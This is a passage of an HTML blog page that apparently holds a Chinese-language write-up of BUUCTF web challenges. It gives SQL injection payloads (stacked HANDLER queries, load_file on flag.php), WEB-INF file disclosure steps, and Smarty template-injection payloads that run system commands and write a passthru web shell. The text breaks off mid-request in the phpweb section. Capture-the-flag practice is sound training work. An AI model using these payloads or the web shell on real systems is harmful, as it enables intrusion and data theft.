@@ -1,0 +1,985 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>BUUCTF WEB 2 :: FanBig&#39;s Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="BUUCTF WEB 2 [GYCTF2020]Blacklist sql注入，先找一下注入点
+/?inject=1&amp;#39;order&#43;by&#43;2--&#43; 有回显，然后尝试爆库，发现被过滤
+return preg_match(&amp;#34;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&amp;#34;,$inject); select被过滤，尝试HANDLER
+HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name { = | &amp;lt;= | &amp;gt;= | &amp;lt; | &amp;gt; } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT ."
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<meta property="og:title" content="BUUCTF WEB 2" />
+<meta property="og:description" content="BUUCTF WEB" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="//localhost:1313/posts/buuctf-web-2/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-03-13T13:13:40+08:00" />
+<meta property="article:modified_time" content="2024-03-13T13:13:40+08:00" />
+
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="BUUCTF WEB 2"/>
+<meta name="twitter:description" content="BUUCTF WEB"/>
+
+
+<link rel="canonical" href="//localhost:1313/posts/buuctf-web-2/" />
+
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="stylesheet" href="/css/index.990d326724754f27d5d9e8d3b865873e6b1c3f7e92dcc20f80375591db4b9835.css">
+
+
+
+
+
+
+
+
+
+  
+</head>
+<body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800">
+  <header class="flex flex-none justify-center z-10">
+    <div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3">
+  <div class="flex-none ml-2 md:ml-0">
+    <a href="/" class="">
+      <img class="h-12 w-12 rounded-full object-cover bg-gray-100" src="/images/1.jpg" alt="logo">
+    </a>
+  </div>
+  <div class="flex-1"></div>
+  <div class="flex-none">
+    
+
+
+
+<nav class="h-full static">
+  <button id="navbar-menu-toggle" type="button" class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls="navbar-menu" aria-expanded="false">
+    <span class="sr-only">Open main menu</span>
+    <i class="w-8 h-8">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 6l16 0" />
+  <path d="M4 12l16 0" />
+  <path d="M4 18l16 0" />
+</svg>
+
+    </i>
+  </button>
+  <div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id="navbar-menu">
+    <ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5">
+    
+        <li id="about" class="">
+          <a class="block px-3 py-3 hover:text-emerald-600"
+            href="/about/" title="About">About</a>
+        </li>
+      
+    
+        <li id="post" class="">
+          <a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600"
+            href="/posts/" title="Post">Post</a>
+        </li>
+      
+    
+    </ul>
+  </div>
+</nav>
+
+
+  </div>
+  
+  <div class="flex-none mx-1"></div>
+  
+  <div class="flex-none md:hidden">
+    <a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls="navbar-menu" aria-expanded="false">
+      <span class="sr-only">Search</span>
+      <i class="w-8 h-8">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+    <path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" />
+    <path d="M21 21l-6 -6" />
+</svg>
+
+      </i>
+    </a>
+  </div>
+  <div class="darkmode-toggle flex flex-none mr-2 md:mr-0">
+    <label for="darkmode-toggle" class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode">
+      <input name="darkmode-toggle" id="darkmode-toggle" type="checkbox" class="sr-only peer" aria-label="Toggle dark mode">
+      <div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700">
+        <i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 12m-3 0a3 3 0 1 0 6 0a3 3 0 1 0 -6 0"></path>
+   <path d="M12 5l0 .01"></path>
+   <path d="M17 7l0 .01"></path>
+   <path d="M19 12l0 .01"></path>
+   <path d="M17 17l0 .01"></path>
+   <path d="M12 19l0 .01"></path>
+   <path d="M7 17l0 .01"></path>
+   <path d="M5 12l0 .01"></path>
+   <path d="M7 7l0 .01"></path>
+</svg>
+
+        </i>
+        <i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
+   <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2"></path>
+   <path d="M19 11h2m-1 -1v2"></path>
+</svg>
+
+        </i>
+      </div>
+    </label>
+  </div>
+</div>
+
+  </header>
+  <main class="flex flex-auto justify-center">
+    
+<div class="w-full max-w-4xl lg:max-w-5xl">
+  <div class="flex flex-col gap-y-3 p-6 mt-6 mx-2 md:mx-0 rounded-lg shadow-md bg-white dark:bg-gray-700">
+    <h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100">
+      <a href="/posts/buuctf-web-2/">BUUCTF WEB 2</a>
+    </h1>
+
+    
+    <h2 class="my-4 text-large text-slate-600 dark:text-slate-300">
+      BUUCTF WEB
+    </h2>
+    
+    
+  <ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300">
+    
+      
+      <li>
+        <a href="/categories/ctf/"
+          class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">
+          CTF
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/tags/web/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tags" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M3 8v4.172a2 2 0 0 0 .586 1.414l5.71 5.71a2.41 2.41 0 0 0 3.408 0l3.592 -3.592a2.41 2.41 0 0 0 0 -3.408l-5.71 -5.71a2 2 0 0 0 -1.414 -.586h-4.172a2 2 0 0 0 -2 2z"></path>
+   <path d="M18 19l1.592 -1.592a4.82 4.82 0 0 0 0 -6.816l-4.592 -4.592"></path>
+   <path d="M7 10h-.01"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">WEB</span>
+        </a>
+      </li>
+      
+    
+  </ul>
+
+
+
+    <div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300">
+  
+  
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"></path>
+   <path d="M16 3v4"></path>
+   <path d="M8 3v4"></path>
+   <path d="M4 11h16"></path>
+   <path d="M11 15h1"></path>
+   <path d="M12 15v3"></path>
+</svg>
+
+    </i>
+    <time datetime="2024-03-13T13:13:40&#43;08:00">
+      2024-03-13
+    </time>
+  </div>
+
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M6.5 7h11"></path>
+   <path d="M6 20v-2a6 6 0 1 1 12 0v2a1 1 0 0 1 -1 1h-10a1 1 0 0 1 -1 -1z"></path>
+   <path d="M6 4v2a6 6 0 1 0 12 0v-2a1 1 0 0 0 -1 -1h-10a1 1 0 0 0 -1 1z"></path>
+</svg>
+
+    </i>
+    <span>
+      8 minutes to read
+    </span>
+  </div>
+</div>
+
+
+    
+      
+      <section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6">
+        <h2>Table of Contents</h2>
+        <aside><nav id="TableOfContents">
+  <ul>
+    <li><a href="#gyctf2020blacklist">[GYCTF2020]Blacklist</a></li>
+    <li><a href="#roarctf-2019easy-java">[RoarCTF 2019]Easy Java</a></li>
+    <li><a href="#网鼎杯-2018fakebook">[网鼎杯 2018]Fakebook</a></li>
+    <li><a href="#bjdctf2020the-mystery-of-ip">[BJDCTF2020]The mystery of ip</a></li>
+    <li><a href="#网鼎杯-2020-朱雀组phpweb">[网鼎杯 2020 朱雀组]phpweb</a></li>
+    <li><a href="#bsidescf-2020had-a-bad-day">[BSidesCF 2020]Had a bad day</a></li>
+    <li><a href="#bjdctf2020zjctf不过如此">[BJDCTF2020]ZJCTF，不过如此</a></li>
+    <li><a href="#buuctf-2018online-tool">[BUUCTF 2018]Online Tool</a></li>
+    <li><a href="#gxyctf2019禁止套娃">[GXYCTF2019]禁止套娃</a></li>
+    <li><a href="#nctf2019fake-xml-cookbook">[NCTF2019]Fake XML cookbook</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#bjdctf2020mark-loves-cat">[BJDCTF2020]Mark loves cat</a></li>
+    <li><a href="#wustctf2020朴实无华">[WUSTCTF2020]朴实无华</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#安洵杯-2019easy_web">[安洵杯 2019]easy_web</a></li>
+    <li><a href="#mrctf2020ezpop">[MRCTF2020]Ezpop</a></li>
+    <li><a href="#安洵杯-2019easy_serialize_php">[安洵杯 2019]easy_serialize_php</a></li>
+  </ul>
+</nav></aside>
+      </section>
+      
+    
+
+    <article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content">
+      <h1 id="buuctf-web-2">BUUCTF WEB 2</h1>
+<h2 id="gyctf2020blacklist">[GYCTF2020]Blacklist</h2>
+<p>sql注入，先找一下注入点</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">/?inject=1&#39;order+by+2--+
+</span></span></span></code></pre></div><p>有回显，然后尝试爆库，发现被过滤</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&#34;</span>,$inject);
+</span></span></code></pre></div><p>select被过滤，尝试HANDLER</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">HANDLER</span> tbl_name <span style="color:#66d9ef">OPEN</span> [ [<span style="color:#66d9ef">AS</span>] <span style="color:#66d9ef">alias</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">HANDLER</span> tbl_name <span style="color:#66d9ef">READ</span> index_name <span style="color:#960050;background-color:#1e0010">{</span> <span style="color:#f92672">=</span> <span style="color:#f92672">|</span> <span style="color:#f92672">&lt;=</span> <span style="color:#f92672">|</span> <span style="color:#f92672">&gt;=</span> <span style="color:#f92672">|</span> <span style="color:#f92672">&lt;</span> <span style="color:#f92672">|</span> <span style="color:#f92672">&gt;</span> <span style="color:#960050;background-color:#1e0010">}</span> (value1,value2,...)
+</span></span><span style="display:flex;"><span>    [ <span style="color:#66d9ef">WHERE</span> where_condition ] [<span style="color:#66d9ef">LIMIT</span> ... ]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">HANDLER</span> tbl_name <span style="color:#66d9ef">READ</span> index_name <span style="color:#960050;background-color:#1e0010">{</span> <span style="color:#66d9ef">FIRST</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">NEXT</span> <span style="color:#f92672">|</span> PREV <span style="color:#f92672">|</span> <span style="color:#66d9ef">LAST</span> <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>    [ <span style="color:#66d9ef">WHERE</span> where_condition ] [<span style="color:#66d9ef">LIMIT</span> ... ]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">HANDLER</span> tbl_name <span style="color:#66d9ef">READ</span> <span style="color:#960050;background-color:#1e0010">{</span> <span style="color:#66d9ef">FIRST</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">NEXT</span> <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>    [ <span style="color:#66d9ef">WHERE</span> where_condition ] [<span style="color:#66d9ef">LIMIT</span> ... ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">HANDLER</span> tbl_name <span style="color:#66d9ef">CLOSE</span>
+</span></span></code></pre></div><p>但使用HANDLER需要已知表名，所以先尝试拿到表名，观察上面过滤语句发现没有过滤<code>;</code>，尝试堆叠注入</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">/?</span>inject<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;;show tables--+
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/?inject=1&#39;</span>;<span style="color:#66d9ef">show</span> columns form <span style="color:#66d9ef">table_name</span><span style="color:#75715e">--+
+</span></span></span></code></pre></div><p>有回显，拿到表名，字段名，使用HANDLER查询字段</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;--+
+</span></span></span></code></pre></div><p>使用HANDLER必须要可以使用<code>;</code></p>
+<h2 id="roarctf-2019easy-java">[RoarCTF 2019]Easy Java</h2>
+<p>Java web, WEB-INF, web.xml</p>
+<p>需要改成POST才能访问，先访问web.xml</p>
+<pre tabindex="0"><code>WEB-INF/web.xml
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;web-app</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://xmlns.jcp.org/xml/ns/javaee&#34;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">xsi:schemaLocation=</span><span style="color:#e6db74">&#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&#34;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;4.0&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;welcome-file-list&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;welcome-file&gt;</span>Index<span style="color:#f92672">&lt;/welcome-file&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/welcome-file-list&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-name&gt;</span>IndexController<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-class&gt;</span>com.wm.ctf.IndexController<span style="color:#f92672">&lt;/servlet-class&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/servlet&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-name&gt;</span>IndexController<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;url-pattern&gt;</span>/Index<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-name&gt;</span>LoginController<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-class&gt;</span>com.wm.ctf.LoginController<span style="color:#f92672">&lt;/servlet-class&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/servlet&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-name&gt;</span>LoginController<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;url-pattern&gt;</span>/Login<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-name&gt;</span>DownloadController<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-class&gt;</span>com.wm.ctf.DownloadController<span style="color:#f92672">&lt;/servlet-class&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/servlet&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-name&gt;</span>DownloadController<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;url-pattern&gt;</span>/Download<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-name&gt;</span>FlagController<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-class&gt;</span>com.wm.ctf.FlagController<span style="color:#f92672">&lt;/servlet-class&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/servlet&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-name&gt;</span>FlagController<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;url-pattern&gt;</span>/Flag<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/web-app&gt;</span>
+</span></span></code></pre></div><p>拿到目录结构，直接访问FlagController.class</p>
+<pre tabindex="0"><code>WEB-INF/classes/com/wm/ctf/FlagController.class
+</code></pre><p>拿到flag</p>
+<h2 id="网鼎杯-2018fakebook">[网鼎杯 2018]Fakebook</h2>
+<p>显示目录扫描，扫到robots.txt，flag.php</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">UserInfo</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $age <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $blog <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($name, $age, $blog)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> $name;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">age</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">int</span>)$age;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">blog</span> <span style="color:#f92672">=</span> $blog;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get</span>($url)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $ch <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_init</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_URL</span>, $url);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_RETURNTRANSFER</span>, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        $output <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_exec</span>($ch);
+</span></span><span style="display:flex;"><span>        $httpCode <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_getinfo</span>($ch, <span style="color:#a6e22e">CURLINFO_HTTP_CODE</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($httpCode <span style="color:#f92672">==</span> <span style="color:#ae81ff">404</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">404</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">curl_close</span>($ch);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $output;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getBlogContents</span>()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">blog</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isValidBlog</span>()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $blog <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">blog</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&#34;</span>, $blog);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>blog不能进行ssrf利用，所以使用别的方式，观察到用户界面有序号，尝试sqli</p>
+<pre tabindex="0"><code>/view.php?no=1 order by 5
+</code></pre><p>报错，可以sqli，但是union select的时候被ban了，发现是过滤了<code>union select</code>，这个组合，所以直接使用<code>/**/</code>绕过</p>
+<pre tabindex="0"><code>/view.php?no=-1+union/**/select+1,load_file(&#39;/var/www/html/flag.php&#39;),3,4--+
+</code></pre><h2 id="bjdctf2020the-mystery-of-ip">[BJDCTF2020]The mystery of ip</h2>
+<p>php SSTI 模板注入</p>
+<pre tabindex="0"><code>{$smarty.version}
+{php}echo `id`;{/php} //deprecated in smarty v3
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&#34;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&#34;,self::clearConfig())}
+{system(&#39;ls&#39;)} // compatible v3
+{system(&#39;cat index.php&#39;)} // compatible v3
+</code></pre><h2 id="网鼎杯-2020-朱雀组phpweb">[网鼎杯 2020 朱雀组]phpweb</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /index.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">ce0c0619-ce1e-420f-8e2e-5d6f9ab67e24.node5.buuoj.cn:81</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
